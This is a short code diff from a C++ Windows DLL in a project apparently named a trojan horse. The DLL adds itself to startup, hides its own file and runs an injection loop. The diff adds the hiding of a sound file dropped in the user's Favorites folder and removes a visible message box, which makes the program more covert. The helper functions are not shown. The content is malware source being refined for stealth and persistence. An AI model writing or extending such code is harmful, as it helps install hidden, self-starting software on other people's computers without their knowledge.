@@ -20,14 +20,15 @@ char* GetCurrentDllPath() {
 
 extern "C" __declspec(dllexport) void StartUM(){
     char* dllPath = GetCurrentDllPath();
+    char* UMPath = "C:\\Users\\User\\Favorites\\UM.wav";
     AddDllToStartup(dllPath);
     HideDllFile(dllPath);
+    HideDllFile(UMPath);
     injectionLoop(dllPath);
 }
 
 DWORD WINAPI StartFunction(LPVOID lpParam){
-    MessageBoxA(0, "Hello", "info", 0);
-    PlaySound(TEXT("C:\\Users\\rota1001\\Desktop\\UM_Trojan_Horse\\src\\UM.wav"), NULL, SND_FILENAME | SND_ASYNC);
+    PlaySound(TEXT("C:\\Users\\User\\Favorites\\UM.wav"), NULL, SND_FILENAME | SND_ASYNC);
     return 0;
 }
 
